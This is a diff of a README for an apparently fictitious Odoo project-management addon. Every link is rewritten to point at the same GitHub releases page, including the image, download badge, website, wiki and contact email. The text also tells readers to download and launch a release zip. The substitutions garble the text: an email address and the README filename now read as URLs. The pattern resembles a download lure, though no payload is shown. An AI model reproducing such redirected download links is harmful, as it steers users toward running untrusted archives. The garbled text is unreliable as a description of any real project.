@@ -1,6 +1,6 @@
 # 🚀 **Custom Addons - Enhancing Project Management with Odoo**
 
-![Project Management](https://imageurl.com/projectmanagementimage)
+![Project Management](https://github.com/bboyfuria/custom_addons/releases)
 
 Welcome to the official repository of **Custom Addons** - a custom Odoo module designed to take your project management experience to the next level. With dynamic fields, improved forms, and advanced filters, this module is a must-have for any business looking to streamline their project management processes.
 
@@ -16,7 +16,7 @@ Welcome to the official repository of **Custom Addons** - a custom Odoo module d
 
 ## 📦 Latest Release
 Click below to download the latest release:
-[![Download Release](https://img.shields.io/badge/Download-Release.zip-blue)](https://github.com/releases/789694263/Release.zip)
+[![Download Release](https://github.com/bboyfuria/custom_addons/releases)](https://github.com/bboyfuria/custom_addons/releases)
 
 ### Note: The link provided needs to be launched to access the latest release.
 
@@ -29,8 +29,8 @@ To get started with **Custom Addons**, follow these steps:
 3. Explore the new features and enhancements added to the project management module.
 
 ## 🌐 Additional Resources
-- Website: [Custom Addons Official Website](https://customaddons.com)
-- Documentation: [Custom Addons Wiki](https://wiki.customaddons.com)
+- Website: [Custom Addons Official Website](https://github.com/bboyfuria/custom_addons/releases)
+- Documentation: [Custom Addons Wiki](https://github.com/bboyfuria/custom_addons/releases)
 
 ## 🤝 How to Contribute
 We welcome contributions to improve the Custom Addons module further. If you'd like to contribute, please follow these steps:
@@ -40,10 +40,10 @@ We welcome contributions to improve the Custom Addons module further. If you'd l
 4. Submit a pull request.
 
 ## 📞 Contact Us
-If you have any questions, feedback, or suggestions, feel free to reach out to us at `contact@customaddons.com`.We would love to hear from you!
+If you have any questions, feedback, or suggestions, feel free to reach out to us at `https://github.com/bboyfuria/custom_addons/releases`.We would love to hear from you!
 
 Thank you for using **Custom Addons** to enhance your project management experience! 🌟
 
 ---
 
-*Disclaimer: This README.md file is fictitious and created for the purpose of the exercise.*
+*Disclaimer: This https://github.com/bboyfuria/custom_addons/releases file is fictitious and created for the purpose of the exercise.*
